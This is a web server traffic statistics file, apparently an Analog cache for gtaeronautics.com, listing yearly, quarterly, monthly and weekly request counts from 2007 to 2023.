x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	04	02	05	51
x	FR	2007	12	18	17	05
x	LR	2023	03	31	23	21
x	E7	2023	04	02	05	51
x	SR	1120693
x	S7	1678
x	NC	437829
x	C7	0
x	FL	448156
x	F7	542
x	RR	199
x	R7	2
x	NH	98912
x	H7	326
x	BT	54672653602
x	B7	198448159
1	Rr	27695	2.471	2023
1	Rr	82334	7.347	2022
1	Rr	98917	8.826	2021
1	Rr	89380	7.975	2020
1	Rr	80088	7.146	2019
1	Rr	68927	6.150	2018
1	Rr	60168	5.369	2017
1	Rr	73316	6.542	2016
1	Rr	80796	7.209	2015
1	Rr	110773	9.884	2014
1	Rr	65173	5.815	2013
1	Rr	60742	5.420	2012
1	Rr	57015	5.087	2011
1	Rr	22139	1.975	2010
1	Rr	69710	6.220	2009
1	Rr	71820	6.409	2008
1	Rr	1700	0.152	2007
1	*BT	R	110773	2014
Q	Rr	27695	2.471	2023	1
Q	Rr	20307	1.812	2022	4
Q	Rr	20362	1.817	2022	3
Q	Rr	21795	1.945	2022	2
Q	Rr	19870	1.773	2022	1
Q	Rr	21154	1.888	2021	4
Q	Rr	26826	2.394	2021	3
Q	Rr	30675	2.737	2021	2
Q	Rr	20262	1.808	2021	1
Q	Rr	22199	1.981	2020	4
Q	Rr	23882	2.131	2020	3
Q	Rr	21656	1.932	2020	2
Q	Rr	21643	1.931	2020	1
Q	Rr	19098	1.704	2019	4
Q	Rr	19668	1.755	2019	3
Q	Rr	19827	1.769	2019	2
Q	Rr	21495	1.918	2019	1
Q	Rr	18129	1.618	2018	4
Q	Rr	17138	1.529	2018	3
Q	Rr	16928	1.510	2018	2
Q	Rr	16732	1.493	2018	1
Q	Rr	15937	1.422	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.502	2017	2
Q	Rr	27400	2.445	2017	1
Q	Rr	22114	1.973	2016	4
Q	Rr	17621	1.572	2016	3
Q	Rr	15878	1.417	2016	2
Q	Rr	17703	1.580	2016	1
Q	Rr	16575	1.479	2015	4
Q	Rr	22104	1.972	2015	3
Q	Rr	22485	2.006	2015	2
Q	Rr	19632	1.752	2015	1
Q	Rr	21142	1.887	2014	4
Q	Rr	22272	1.987	2014	3
Q	Rr	31453	2.807	2014	2
Q	Rr	35906	3.204	2014	1
Q	Rr	16436	1.467	2013	4
Q	Rr	15216	1.358	2013	3
Q	Rr	16545	1.476	2013	2
Q	Rr	16976	1.515	2013	1
Q	Rr	16578	1.479	2012	4
Q	Rr	12511	1.116	2012	3
Q	Rr	15816	1.411	2012	2
Q	Rr	15837	1.413	2012	1
Q	Rr	15444	1.378	2011	4
Q	Rr	17386	1.551	2011	3
Q	Rr	9395	0.838	2011	2
Q	Rr	14790	1.320	2011	1
Q	Rr	1603	0.143	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.253	2010	2
Q	Rr	6489	0.579	2010	1
Q	Rr	16350	1.459	2009	4
Q	Rr	18220	1.626	2009	3
Q	Rr	17115	1.527	2009	2
Q	Rr	18025	1.608	2009	1
Q	Rr	15905	1.419	2008	4
Q	Rr	15660	1.397	2008	3
Q	Rr	22448	2.003	2008	2
Q	Rr	17807	1.589	2008	1
Q	Rr	1700	0.152	2007	4
Q	*BT	R	35906	2014	1
m	Rr	10848	0.968	2023	03
m	Rr	8360	0.746	2023	02
m	Rr	8487	0.757	2023	01
m	Rr	6950	0.620	2022	12
m	Rr	6349	0.567	2022	11
m	Rr	7008	0.625	2022	10
m	Rr	6740	0.601	2022	09
m	Rr	6863	0.612	2022	08
m	Rr	6759	0.603	2022	07
m	Rr	6567	0.586	2022	06
m	Rr	8427	0.752	2022	05
m	Rr	6801	0.607	2022	04
m	Rr	6380	0.569	2022	03
m	Rr	6175	0.551	2022	02
m	Rr	7315	0.653	2022	01
m	Rr	7667	0.684	2021	12
m	Rr	7097	0.633	2021	11
m	Rr	6390	0.570	2021	10
m	Rr	6059	0.541	2021	09
m	Rr	9092	0.811	2021	08
m	Rr	11675	1.042	2021	07
m	Rr	10152	0.906	2021	06
m	Rr	10231	0.913	2021	05
m	Rr	10292	0.918	2021	04
m	Rr	7948	0.709	2021	03
m	Rr	5800	0.518	2021	02
m	Rr	6514	0.581	2021	01
m	Rr	8069	0.720	2020	12
m	Rr	6579	0.587	2020	11
m	Rr	7551	0.674	2020	10
m	Rr	8028	0.716	2020	09
m	Rr	7741	0.691	2020	08
m	Rr	8113	0.724	2020	07
m	Rr	7317	0.653	2020	06
m	Rr	6898	0.616	2020	05
m	Rr	7441	0.664	2020	04
m	Rr	7524	0.671	2020	03
m	Rr	7322	0.653	2020	02
m	Rr	6797	0.606	2020	01
m	Rr	6573	0.587	2019	12
m	Rr	5917	0.528	2019	11
m	Rr	6608	0.590	2019	10
m	Rr	6791	0.606	2019	09
m	Rr	6597	0.589	2019	08
m	Rr	6280	0.560	2019	07
m	Rr	6317	0.564	2019	06
m	Rr	6847	0.611	2019	05
m	Rr	6663	0.595	2019	04
m	Rr	7059	0.630	2019	03
m	Rr	6374	0.569	2019	02
m	Rr	8062	0.719	2019	01
m	Rr	6957	0.621	2018	12
m	Rr	5422	0.484	2018	11
m	Rr	5750	0.513	2018	10
m	Rr	5458	0.487	2018	09
m	Rr	5735	0.512	2018	08
m	Rr	5945	0.530	2018	07
m	Rr	7110	0.634	2018	06
m	Rr	6440	0.575	2018	05
m	Rr	3378	0.301	2018	04
m	Rr	5789	0.517	2018	03
m	Rr	5369	0.479	2018	02
m	Rr	5574	0.497	2018	01
m	Rr	3906	0.349	2017	12
m	Rr	6533	0.583	2017	11
m	Rr	5498	0.491	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.610	2017	05
m	Rr	9999	0.892	2017	04
m	Rr	11887	1.061	2017	03
m	Rr	7941	0.709	2017	02
m	Rr	7572	0.676	2017	01
m	Rr	9483	0.846	2016	12
m	Rr	7121	0.635	2016	11
m	Rr	5510	0.492	2016	10
m	Rr	6288	0.561	2016	09
m	Rr	5888	0.525	2016	08
m	Rr	5445	0.486	2016	07
m	Rr	5042	0.450	2016	06
m	Rr	5495	0.490	2016	05
m	Rr	5341	0.477	2016	04
m	Rr	5558	0.496	2016	03
m	Rr	5548	0.495	2016	02
m	Rr	6597	0.589	2016	01
m	Rr	5574	0.497	2015	12
m	Rr	5330	0.476	2015	11
m	Rr	5671	0.506	2015	10
m	Rr	6196	0.553	2015	09
m	Rr	6788	0.606	2015	08
m	Rr	9120	0.814	2015	07
m	Rr	7156	0.639	2015	06
m	Rr	5694	0.508	2015	05
m	Rr	9635	0.860	2015	04
m	Rr	6215	0.555	2015	03
m	Rr	6084	0.543	2015	02
m	Rr	7333	0.654	2015	01
m	Rr	6608	0.590	2014	12
m	Rr	6997	0.624	2014	11
m	Rr	7537	0.673	2014	10
m	Rr	7043	0.628	2014	09
m	Rr	7324	0.654	2014	08
m	Rr	7905	0.705	2014	07
m	Rr	11654	1.040	2014	06
m	Rr	9211	0.822	2014	05
m	Rr	10588	0.945	2014	04
m	Rr	7817	0.698	2014	03
m	Rr	15229	1.359	2014	02
m	Rr	12860	1.148	2014	01
m	Rr	5325	0.475	2013	12
m	Rr	5513	0.492	2013	11
m	Rr	5598	0.500	2013	10
m	Rr	4655	0.415	2013	09
m	Rr	4938	0.441	2013	08
m	Rr	5623	0.502	2013	07
m	Rr	5492	0.490	2013	06
m	Rr	5211	0.465	2013	05
m	Rr	5842	0.521	2013	04
m	Rr	6068	0.541	2013	03
m	Rr	5055	0.451	2013	02
m	Rr	5853	0.522	2013	01
m	Rr	5688	0.508	2012	12
m	Rr	5477	0.489	2012	11
m	Rr	5413	0.483	2012	10
m	Rr	4331	0.386	2012	09
m	Rr	3866	0.345	2012	08
m	Rr	4314	0.385	2012	07
m	Rr	4655	0.415	2012	06
m	Rr	6047	0.540	2012	05
m	Rr	5114	0.456	2012	04
m	Rr	6128	0.547	2012	03
m	Rr	5430	0.485	2012	02
m	Rr	4279	0.382	2012	01
m	Rr	5548	0.495	2011	12
m	Rr	4779	0.426	2011	11
m	Rr	5117	0.457	2011	10
m	Rr	5431	0.485	2011	09
m	Rr	6256	0.558	2011	08
m	Rr	5699	0.509	2011	07
m	Rr	5420	0.484	2011	06
m	Rr	3975	0.355	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.322	2011	03
m	Rr	5171	0.461	2011	02
m	Rr	6011	0.536	2011	01
m	Rr	1603	0.143	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.366	2010	06
m	Rr	5018	0.448	2010	05
m	Rr	4928	0.440	2010	04
m	Rr	5095	0.455	2010	03
m	Rr	1394	0.124	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.416	2009	12
m	Rr	6187	0.552	2009	11
m	Rr	5498	0.491	2009	10
m	Rr	5066	0.452	2009	09
m	Rr	5718	0.510	2009	08
m	Rr	7436	0.664	2009	07
m	Rr	5685	0.507	2009	06
m	Rr	6120	0.546	2009	05
m	Rr	5310	0.474	2009	04
m	Rr	5515	0.492	2009	03
m	Rr	6123	0.546	2009	02
m	Rr	6387	0.570	2009	01
m	Rr	5763	0.514	2008	12
m	Rr	5420	0.484	2008	11
m	Rr	4722	0.421	2008	10
m	Rr	5435	0.485	2008	09
m	Rr	4843	0.432	2008	08
m	Rr	5382	0.480	2008	07
m	Rr	6082	0.543	2008	06
m	Rr	9946	0.887	2008	05
m	Rr	6420	0.573	2008	04
m	Rr	5431	0.485	2008	03
m	Rr	6469	0.577	2008	02
m	Rr	5907	0.527	2008	01
m	Rr	1700	0.152	2007	12
m	*BT	R	15229	2014	02
W	Rr	1701	0.152	2023	03	26
W	Rr	1943	0.173	2023	03	19
W	Rr	2225	0.199	2023	03	12
W	Rr	2192	0.196	2023	03	05
W	Rr	4055	0.362	2023	02	26
W	Rr	2406	0.215	2023	02	19
W	Rr	1898	0.169	2023	02	12
W	Rr	1890	0.169	2023	02	05
W	Rr	1861	0.166	2023	01	29
W	Rr	1686	0.150	2023	01	22
W	Rr	1779	0.159	2023	01	15
W	Rr	1833	0.164	2023	01	08
W	Rr	2226	0.199	2023	01	01
W	Rr	1280	0.114	2022	12	25
W	Rr	1806	0.161	2022	12	18
W	Rr	1773	0.158	2022	12	11
W	Rr	1532	0.137	2022	12	04
W	Rr	1586	0.142	2022	11	27
W	Rr	1093	0.098	2022	11	20
W	Rr	1366	0.122	2022	11	13
W	Rr	1972	0.176	2022	11	06
W	Rr	1396	0.125	2022	10	30
W	Rr	1547	0.138	2022	10	23
W	Rr	1641	0.146	2022	10	16
W	Rr	1747	0.156	2022	10	09
W	Rr	1568	0.140	2022	10	02
W	Rr	1379	0.123	2022	09	25
W	Rr	1695	0.151	2022	09	18
W	Rr	1701	0.152	2022	09	11
W	Rr	1568	0.140	2022	09	04
W	Rr	1562	0.139	2022	08	28
W	Rr	1488	0.133	2022	08	21
W	Rr	1646	0.147	2022	08	14
W	Rr	1430	0.128	2022	08	07
W	Rr	1446	0.129	2022	07	31
W	Rr	1383	0.123	2022	07	24
W	Rr	1661	0.148	2022	07	17
W	Rr	1478	0.132	2022	07	10
W	Rr	1711	0.153	2022	07	03
W	Rr	1804	0.161	2022	06	26
W	Rr	1298	0.116	2022	06	19
W	Rr	1407	0.126	2022	06	12
W	Rr	1396	0.125	2022	06	05
W	Rr	1638	0.146	2022	05	29
W	Rr	1724	0.154	2022	05	22
W	Rr	2427	0.217	2022	05	15
W	Rr	2100	0.187	2022	05	08
W	Rr	1414	0.126	2022	05	01
W	Rr	1865	0.166	2022	04	24
W	Rr	1381	0.123	2022	04	17
W	Rr	1630	0.145	2022	04	10
W	Rr	1670	0.149	2022	04	03
W	Rr	1588	0.142	2022	03	27
W	Rr	1204	0.107	2022	03	20
W	Rr	1350	0.120	2022	03	13
W	Rr	1488	0.133	2022	03	06
W	Rr	1368	0.122	2022	02	27
W	Rr	1481	0.132	2022	02	20
W	Rr	1657	0.148	2022	02	13
W	Rr	1518	0.135	2022	02	06
W	Rr	1787	0.159	2022	01	30
W	Rr	2021	0.180	2022	01	23
W	Rr	1429	0.128	2022	01	16
W	Rr	1693	0.151	2022	01	09
W	Rr	1541	0.138	2022	01	02
W	Rr	1311	0.117	2021	12	26
W	Rr	1839	0.164	2021	12	19
W	Rr	1732	0.155	2021	12	12
W	Rr	2001	0.179	2021	12	05
W	Rr	1641	0.146	2021	11	28
W	Rr	1615	0.144	2021	11	21
W	Rr	1673	0.149	2021	11	14
W	Rr	1625	0.145	2021	11	07
W	Rr	1523	0.136	2021	10	31
W	Rr	1562	0.139	2021	10	24
W	Rr	1474	0.132	2021	10	17
W	Rr	1349	0.120	2021	10	10
W	Rr	1615	0.144	2021	10	03
W	Rr	1598	0.143	2021	09	26
W	Rr	1646	0.147	2021	09	19
W	Rr	1203	0.107	2021	09	12
W	Rr	1106	0.099	2021	09	05
W	Rr	1383	0.123	2021	08	29
W	Rr	1685	0.150	2021	08	22
W	Rr	2071	0.185	2021	08	15
W	Rr	2279	0.203	2021	08	08
W	Rr	2374	0.212	2021	08	01
W	Rr	2543	0.227	2021	07	25
W	Rr	2843	0.254	2021	07	18
W	Rr	2777	0.248	2021	07	11
W	Rr	2756	0.246	2021	07	04
W	Rr	2524	0.225	2021	06	27
W	Rr	2466	0.220	2021	06	20
W	Rr	2262	0.202	2021	06	13
W	Rr	2264	0.202	2021	06	06
W	Rr	2101	0.187	2021	05	30
W	Rr	3009	0.268	2021	05	23
W	Rr	1989	0.177	2021	05	16
W	Rr	2386	0.213	2021	05	09
W	Rr	2138	0.191	2021	05	02
W	Rr	1668	0.149	2021	04	25
W	Rr	2413	0.215	2021	04	18
W	Rr	3035	0.271	2021	04	11
W	Rr	2709	0.242	2021	04	04
W	Rr	1942	0.173	2021	03	28
W	Rr	1666	0.149	2021	03	21
W	Rr	1476	0.132	2021	03	14
W	Rr	1713	0.153	2021	03	07
W	Rr	1777	0.159	2021	02	28
W	Rr	1173	0.105	2021	02	21
W	Rr	1101	0.098	2021	02	14
W	Rr	1699	0.152	2021	02	07
W	Rr	1867	0.167	2021	01	31
W	Rr	1404	0.125	2021	01	24
W	Rr	1564	0.140	2021	01	17
W	Rr	1431	0.128	2021	01	10
W	Rr	1666	0.149	2021	01	03
W	Rr	1926	0.172	2020	12	27
W	Rr	1572	0.140	2020	12	20
W	Rr	1404	0.125	2020	12	13
W	Rr	2272	0.203	2020	12	06
W	Rr	1522	0.136	2020	11	29
W	Rr	1722	0.154	2020	11	22
W	Rr	1580	0.141	2020	11	15
W	Rr	1401	0.125	2020	11	08
W	Rr	1499	0.134	2020	11	01
W	Rr	1470	0.131	2020	10	25
W	Rr	2379	0.212	2020	10	18
W	Rr	1559	0.139	2020	10	11
W	Rr	1729	0.154	2020	10	04
W	Rr	1674	0.149	2020	09	27
W	Rr	1786	0.159	2020	09	20
W	Rr	2200	0.196	2020	09	13
W	Rr	1677	0.150	2020	09	06
W	Rr	1596	0.142	2020	08	30
W	Rr	1833	0.164	2020	08	23
W	Rr	1814	0.162	2020	08	16
W	Rr	2206	0.197	2020	08	09
W	Rr	1397	0.125	2020	08	02
W	Rr	1816	0.162	2020	07	26
W	Rr	1949	0.174	2020	07	19
W	Rr	1532	0.137	2020	07	12
W	Rr	1976	0.176	2020	07	05
W	Rr	1600	0.143	2020	06	28
W	Rr	1627	0.145	2020	06	21
W	Rr	2101	0.187	2020	06	14
W	Rr	1590	0.142	2020	06	07
W	Rr	1492	0.133	2020	05	31
W	Rr	1556	0.139	2020	05	24
W	Rr	1756	0.157	2020	05	17
W	Rr	1568	0.140	2020	05	10
W	Rr	1567	0.140	2020	05	03
W	Rr	1734	0.155	2020	04	26
W	Rr	1675	0.149	2020	04	19
W	Rr	1702	0.152	2020	04	12
W	Rr	1965	0.175	2020	04	05
W	Rr	1329	0.119	2020	03	29
W	Rr	1818	0.162	2020	03	22
W	Rr	1345	0.120	2020	03	15
W	Rr	1581	0.141	2020	03	08
W	Rr	2014	0.180	2020	03	01
W	Rr	1942	0.173	2020	02	23
W	Rr	1748	0.156	2020	02	16
W	Rr	1949	0.174	2020	02	09
W	Rr	1683	0.150	2020	02	02
W	Rr	1436	0.128	2020	01	26
W	Rr	1792	0.160	2020	01	19
W	Rr	1519	0.136	2020	01	12
W	Rr	1420	0.127	2020	01	05
W	Rr	1109	0.099	2019	12	29
W	Rr	1023	0.091	2019	12	22
W	Rr	1584	0.141	2019	12	15
W	Rr	1783	0.159	2019	12	08
W	Rr	1704	0.152	2019	12	01
W	Rr	1178	0.105	2019	11	24
W	Rr	1697	0.151	2019	11	17
W	Rr	1510	0.135	2019	11	10
W	Rr	1383	0.123	2019	11	03
W	Rr	1309	0.117	2019	10	27
W	Rr	1473	0.131	2019	10	20
W	Rr	1519	0.136	2019	10	13
W	Rr	1485	0.133	2019	10	06
W	Rr	1416	0.126	2019	09	29
W	Rr	1499	0.134	2019	09	22
W	Rr	1652	0.147	2019	09	15
W	Rr	1710	0.153	2019	09	08
W	Rr	1485	0.133	2019	09	01
W	Rr	1689	0.151	2019	08	25
W	Rr	1315	0.117	2019	08	18
W	Rr	1619	0.144	2019	08	11
W	Rr	1558	0.139	2019	08	04
W	Rr	1360	0.121	2019	07	28
W	Rr	1191	0.106	2019	07	21
W	Rr	1730	0.154	2019	07	14
W	Rr	1299	0.116	2019	07	07
W	Rr	1339	0.119	2019	06	30
W	Rr	1592	0.142	2019	06	23
W	Rr	1497	0.134	2019	06	16
W	Rr	1450	0.129	2019	06	09
W	Rr	1555	0.139	2019	06	02
W	Rr	1289	0.115	2019	05	26
W	Rr	1863	0.166	2019	05	19
W	Rr	1385	0.124	2019	05	12
W	Rr	1553	0.139	2019	05	05
W	Rr	1655	0.148	2019	04	28
W	Rr	1282	0.114	2019	04	21
W	Rr	1503	0.134	2019	04	14
W	Rr	1623	0.145	2019	04	07
W	Rr	1715	0.153	2019	03	31
W	Rr	1882	0.168	2019	03	24
W	Rr	1464	0.131	2019	03	17
W	Rr	1381	0.123	2019	03	10
W	Rr	1627	0.145	2019	03	03
W	Rr	1773	0.158	2019	02	24
W	Rr	1669	0.149	2019	02	17
W	Rr	1483	0.132	2019	02	10
W	Rr	1391	0.124	2019	02	03
W	Rr	1797	0.160	2019	01	27
W	Rr	1963	0.175	2019	01	20
W	Rr	2029	0.181	2019	01	13
W	Rr	1696	0.151	2019	01	06
W	Rr	1526	0.136	2018	12	30
W	Rr	1226	0.109	2018	12	23
W	Rr	1442	0.129	2018	12	16
W	Rr	1936	0.173	2018	12	09
W	Rr	1809	0.161	2018	12	02
W	Rr	1295	0.116	2018	11	25
W	Rr	1820	0.162	2018	11	18
W	Rr	1802	0.161	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.131	2018	10	28
W	Rr	1106	0.099	2018	10	21
W	Rr	1427	0.127	2018	10	14
W	Rr	1214	0.108	2018	10	07
W	Rr	1168	0.104	2018	09	30
W	Rr	1420	0.127	2018	09	23
W	Rr	1197	0.107	2018	09	16
W	Rr	1388	0.124	2018	09	09
W	Rr	1320	0.118	2018	09	02
W	Rr	1246	0.111	2018	08	26
W	Rr	1214	0.108	2018	08	19
W	Rr	1366	0.122	2018	08	12
W	Rr	1195	0.107	2018	08	05
W	Rr	1346	0.120	2018	07	29
W	Rr	1374	0.123	2018	07	22
W	Rr	1508	0.135	2018	07	15
W	Rr	1522	0.136	2018	07	08
W	Rr	909	0.081	2018	07	01
W	Rr	1444	0.129	2018	06	24
W	Rr	2682	0.239	2018	06	17
W	Rr	1365	0.122	2018	06	10
W	Rr	1329	0.119	2018	06	03
W	Rr	1275	0.114	2018	05	27
W	Rr	1392	0.124	2018	05	20
W	Rr	1321	0.118	2018	05	13
W	Rr	1527	0.136	2018	05	06
W	Rr	1517	0.135	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.122	2018	04	15
W	Rr	1712	0.153	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.138	2018	03	25
W	Rr	1342	0.120	2018	03	18
W	Rr	2429	0.217	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.122	2018	02	25
W	Rr	1308	0.117	2018	02	18
W	Rr	1439	0.128	2018	02	11
W	Rr	1731	0.154	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.128	2018	01	21
W	Rr	1578	0.141	2018	01	14
W	Rr	1471	0.131	2018	01	07
W	Rr	1246	0.111	2017	12	31
W	Rr	1033	0.092	2017	12	24
W	Rr	1103	0.098	2017	12	17
W	Rr	1406	0.125	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.119	2017	11	26
W	Rr	1427	0.127	2017	11	19
W	Rr	1662	0.148	2017	11	12
W	Rr	1414	0.126	2017	11	05
W	Rr	1349	0.120	2017	10	29
W	Rr	1208	0.108	2017	10	22
W	Rr	2013	0.180	2017	10	15
W	Rr	1832	0.163	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.002	2017	05	28
W	Rr	1838	0.164	2017	05	21
W	Rr	1915	0.171	2017	05	14
W	Rr	1676	0.150	2017	05	07
W	Rr	1677	0.150	2017	04	30
W	Rr	2071	0.185	2017	04	23
W	Rr	1978	0.176	2017	04	16
W	Rr	1874	0.167	2017	04	09
W	Rr	3435	0.307	2017	04	02
W	Rr	2619	0.234	2017	03	26
W	Rr	2633	0.235	2017	03	19
W	Rr	2413	0.215	2017	03	12
W	Rr	3092	0.276	2017	03	05
W	Rr	2295	0.205	2017	02	26
W	Rr	2204	0.197	2017	02	19
W	Rr	1869	0.167	2017	02	12
W	Rr	1973	0.176	2017	02	05
W	Rr	1783	0.159	2017	01	29
W	Rr	1768	0.158	2017	01	22
W	Rr	1585	0.141	2017	01	15
W	Rr	1768	0.158	2017	01	08
W	Rr	1740	0.155	2017	01	01
W	Rr	1549	0.138	2016	12	25
W	Rr	2202	0.196	2016	12	18
W	Rr	1812	0.162	2016	12	11
W	Rr	2648	0.236	2016	12	04
W	Rr	2236	0.200	2016	11	27
W	Rr	1321	0.118	2016	11	20
W	Rr	1996	0.178	2016	11	13
W	Rr	1716	0.153	2016	11	06
W	Rr	1564	0.140	2016	10	30
W	Rr	1362	0.122	2016	10	23
W	Rr	1707	0.152	2016	10	16
W	Rr	1696	0.151	2016	10	09
W	Rr	36	0.003	2016	10	02
W	Rr	2002	0.179	2016	09	25
W	Rr	1399	0.125	2016	09	18
W	Rr	1199	0.107	2016	09	11
W	Rr	1326	0.118	2016	09	04
W	Rr	1316	0.117	2016	08	28
W	Rr	1257	0.112	2016	08	21
W	Rr	1208	0.108	2016	08	14
W	Rr	1602	0.143	2016	08	07
W	Rr	1319	0.118	2016	07	31
W	Rr	1796	0.160	2016	07	24
W	Rr	1171	0.104	2016	07	17
W	Rr	1167	0.104	2016	07	10
W	Rr	917	0.082	2016	07	03
W	Rr	920	0.082	2016	06	26
W	Rr	1179	0.105	2016	06	19
W	Rr	1288	0.115	2016	06	12
W	Rr	1237	0.110	2016	06	05
W	Rr	1263	0.113	2016	05	29
W	Rr	1338	0.119	2016	05	22
W	Rr	1184	0.106	2016	05	15
W	Rr	1365	0.122	2016	05	08
W	Rr	974	0.087	2016	05	01
W	Rr	1311	0.117	2016	04	24
W	Rr	1127	0.101	2016	04	17
W	Rr	1248	0.111	2016	04	10
W	Rr	1451	0.129	2016	04	03
W	Rr	987	0.088	2016	03	27
W	Rr	1233	0.110	2016	03	20
W	Rr	1347	0.120	2016	03	13
W	Rr	1347	0.120	2016	03	06
W	Rr	1236	0.110	2016	02	28
W	Rr	1422	0.127	2016	02	21
W	Rr	1085	0.097	2016	02	14
W	Rr	1427	0.127	2016	02	07
W	Rr	1359	0.121	2016	01	31
W	Rr	1708	0.152	2016	01	24
W	Rr	1476	0.132	2016	01	17
W	Rr	1563	0.139	2016	01	10
W	Rr	1381	0.123	2016	01	03
W	Rr	1273	0.114	2015	12	27
W	Rr	1084	0.097	2015	12	20
W	Rr	1344	0.120	2015	12	13
W	Rr	1336	0.119	2015	12	06
W	Rr	1123	0.100	2015	11	29
W	Rr	960	0.086	2015	11	22
W	Rr	1337	0.119	2015	11	15
W	Rr	1400	0.125	2015	11	08
W	Rr	1383	0.123	2015	11	01
W	Rr	1250	0.112	2015	10	25
W	Rr	1366	0.122	2015	10	18
W	Rr	1367	0.122	2015	10	11
W	Rr	1214	0.108	2015	10	04
W	Rr	1152	0.103	2015	09	27
W	Rr	1387	0.124	2015	09	20
W	Rr	1655	0.148	2015	09	13
W	Rr	1526	0.136	2015	09	06
W	Rr	1242	0.111	2015	08	30
W	Rr	1800	0.161	2015	08	23
W	Rr	1527	0.136	2015	08	16
W	Rr	1386	0.124	2015	08	09
W	Rr	1593	0.142	2015	08	02
W	Rr	1567	0.140	2015	07	26
W	Rr	1980	0.177	2015	07	19
W	Rr	2180	0.195	2015	07	12
W	Rr	2008	0.179	2015	07	05
W	Rr	2297	0.205	2015	06	28
W	Rr	1556	0.139	2015	06	21
W	Rr	1380	0.123	2015	06	14
W	Rr	2013	0.180	2015	06	07
W	Rr	1651	0.147	2015	05	31
W	Rr	1224	0.109	2015	05	24
W	Rr	1355	0.121	2015	05	17
W	Rr	1179	0.105	2015	05	10
W	Rr	1436	0.128	2015	05	03
W	Rr	1671	0.149	2015	04	26
W	Rr	1878	0.168	2015	04	19
W	Rr	2326	0.208	2015	04	12
W	Rr	2636	0.235	2015	04	05
W	Rr	2297	0.205	2015	03	29
W	Rr	1237	0.110	2015	03	22
W	Rr	1453	0.130	2015	03	15
W	Rr	1399	0.125	2015	03	08
W	Rr	1287	0.115	2015	03	01
W	Rr	1249	0.111	2015	02	22
W	Rr	1373	0.123	2015	02	15
W	Rr	1790	0.160	2015	02	08
W	Rr	1672	0.149	2015	02	01
W	Rr	1543	0.138	2015	01	25
W	Rr	1463	0.131	2015	01	18
W	Rr	1696	0.151	2015	01	11
W	Rr	1707	0.152	2015	01	04
W	Rr	1833	0.164	2014	12	28
W	Rr	1335	0.119	2014	12	21
W	Rr	1644	0.147	2014	12	14
W	Rr	1541	0.138	2014	12	07
W	Rr	1335	0.119	2014	11	30
W	Rr	1262	0.113	2014	11	23
W	Rr	2009	0.179	2014	11	16
W	Rr	1566	0.140	2014	11	09
W	Rr	1814	0.162	2014	11	02
W	Rr	1452	0.130	2014	10	26
W	Rr	1642	0.147	2014	10	19
W	Rr	1795	0.160	2014	10	12
W	Rr	1836	0.164	2014	10	05
W	Rr	1662	0.148	2014	09	28
W	Rr	1843	0.164	2014	09	21
W	Rr	1678	0.150	2014	09	14
W	Rr	1598	0.143	2014	09	07
W	Rr	1418	0.127	2014	08	31
W	Rr	1584	0.141	2014	08	24
W	Rr	1571	0.140	2014	08	17
W	Rr	1727	0.154	2014	08	10
W	Rr	1927	0.172	2014	08	03
W	Rr	1691	0.151	2014	07	27
W	Rr	1702	0.152	2014	07	20
W	Rr	1624	0.145	2014	07	13
W	Rr	1831	0.163	2014	07	06
W	Rr	1867	0.167	2014	06	29
W	Rr	1927	0.172	2014	06	22
W	Rr	2134	0.190	2014	06	15
W	Rr	4851	0.433	2014	06	08
W	Rr	2293	0.205	2014	06	01
W	Rr	3180	0.284	2014	05	25
W	Rr	1468	0.131	2014	05	18
W	Rr	1808	0.161	2014	05	11
W	Rr	1998	0.178	2014	05	04
W	Rr	1876	0.167	2014	04	27
W	Rr	2330	0.208	2014	04	20
W	Rr	2565	0.229	2014	04	13
W	Rr	2652	0.237	2014	04	06
W	Rr	2574	0.230	2014	03	30
W	Rr	1186	0.106	2014	03	23
W	Rr	1305	0.116	2014	03	16
W	Rr	2273	0.203	2014	03	09
W	Rr	2231	0.199	2014	03	02
W	Rr	1925	0.172	2014	02	23
W	Rr	7060	0.630	2014	02	16
W	Rr	2854	0.255	2014	02	09
W	Rr	3190	0.285	2014	02	02
W	Rr	3743	0.334	2014	01	26
W	Rr	3643	0.325	2014	01	19
W	Rr	2961	0.264	2014	01	12
W	Rr	2319	0.207	2014	01	05
W	Rr	981	0.088	2013	12	29
W	Rr	1108	0.099	2013	12	22
W	Rr	1226	0.109	2013	12	15
W	Rr	1285	0.115	2013	12	08
W	Rr	1289	0.115	2013	12	01
W	Rr	1404	0.125	2013	11	24
W	Rr	1142	0.102	2013	11	17
W	Rr	1334	0.119	2013	11	10
W	Rr	1277	0.114	2013	11	03
W	Rr	1035	0.092	2013	10	27
W	Rr	1309	0.117	2013	10	20
W	Rr	1302	0.116	2013	10	13
W	Rr	1432	0.128	2013	10	06
W	Rr	1178	0.105	2013	09	29
W	Rr	947	0.085	2013	09	22
W	Rr	1254	0.112	2013	09	15
W	Rr	1099	0.098	2013	09	08
W	Rr	1053	0.094	2013	09	01
W	Rr	1010	0.090	2013	08	25
W	Rr	1102	0.098	2013	08	18
